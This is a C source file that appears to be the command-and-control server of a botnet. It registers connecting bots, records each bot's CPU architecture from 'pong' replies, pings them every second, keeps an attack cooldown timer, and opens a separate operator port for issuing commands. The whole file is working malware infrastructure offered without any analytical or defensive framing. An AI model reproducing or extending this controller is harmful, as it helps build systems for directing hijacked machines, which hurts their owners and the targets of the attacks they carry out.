#include "botnet.h"
#include "user_handler.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

Bot bots[MAX_BOTS];
int bot_count = 0;
int global_cooldown = 0;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;

void* handle_bot(void* arg) {
    int bot_socket = *((int*)arg);
    char buffer[MAX_COMMAND_LENGTH];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int len = recv(bot_socket, buffer, sizeof(buffer), 0);
        if (len <= 0 || strstr(buffer, "pong") == NULL) {
            close(bot_socket);
            pthread_mutex_lock(&bot_mutex);
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].socket == bot_socket) {
                    bots[i] = bots[bot_count - 1];
                    bot_count--;
                    break;
                }
            }
            pthread_mutex_unlock(&bot_mutex);
            break;
        } else if (strstr(buffer, "pong") != NULL) {
            pthread_mutex_lock(&bot_mutex);
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].socket == bot_socket) {
                    bots[i].is_valid = 1;
                    sscanf(buffer, "pong %s", bots[i].arch);
                    break;
                }
            }
            pthread_mutex_unlock(&bot_mutex);
        }
    }
    free(arg);
    return NULL;
}

void* bot_listener(void* arg) {
    int botport = *((int*)arg);
    int bot_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in bot_server_addr;

    bot_server_addr.sin_family = AF_INET;
    bot_server_addr.sin_addr.s_addr = INADDR_ANY;
    bot_server_addr.sin_port = htons(botport);

    int optval = 1;
    setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) < 0) {
        perror(RED "Bot port bind failed" RESET);
        exit(EXIT_FAILURE);
    }
    listen(bot_server_socket, MAX_BOTS);

    while (1) {
        struct sockaddr_in addr;
        socklen_t addrlen = sizeof(addr);
        int bot_socket = accept(bot_server_socket, (struct sockaddr*)&addr, &addrlen);
        setsockopt(bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));

        pthread_mutex_lock(&bot_mutex);
        int duplicate = 0;
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].address.sin_addr.s_addr == addr.sin_addr.s_addr) {
                duplicate = 1;
                break;
            }
        }
        if (!duplicate && bot_count < MAX_BOTS) {
            bots[bot_count].socket = bot_socket;
            bots[bot_count].is_valid = 0;
            bots[bot_count].address = addr;
            pthread_t bot_thread;
            int *arg = malloc(sizeof(int));
            *arg = bot_socket;
            pthread_create(&bot_thread, NULL, handle_bot, arg);
            pthread_detach(bot_thread);
            bot_count++;
        } else {
            close(bot_socket);
        }
        pthread_mutex_unlock(&bot_mutex);
    }
}

void* ping_bots(void* arg) {
    while (1) {
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            send(bots[i].socket, "ping", strlen("ping"), 0);
            bots[i].is_valid = 0; 
        }
        pthread_mutex_unlock(&bot_mutex);
        sleep(1);
    }
    return NULL;
}

void* manage_cooldown(void* arg) {
    while (1) {
        sleep(1);
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            global_cooldown--;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }
    return NULL;
}

void* cnc_listener(void* arg) {
    int cncport = *((int*)arg);
    int cnc_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in cnc_addr;
    cnc_addr.sin_family = AF_INET;
    cnc_addr.sin_addr.s_addr = INADDR_ANY;
    cnc_addr.sin_port = htons(cncport);

    int optval = 1;
    setsockopt(cnc_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    setsockopt(cnc_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    if (bind(cnc_socket, (struct sockaddr*)&cnc_addr, sizeof(cnc_addr)) < 0) {
        perror(RED "CNC port bind failed" RESET);
        exit(EXIT_FAILURE);
    }
    listen(cnc_socket, 10);

    while (1) {
        int client_socket = accept(cnc_socket, NULL, NULL);
        setsockopt(client_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));

        pthread_t client_thread;
        int *arg = malloc(sizeof(int));
        *arg = client_socket;
        pthread_create(&client_thread, NULL, handle_client, arg);
        pthread_detach(client_thread);
    }
}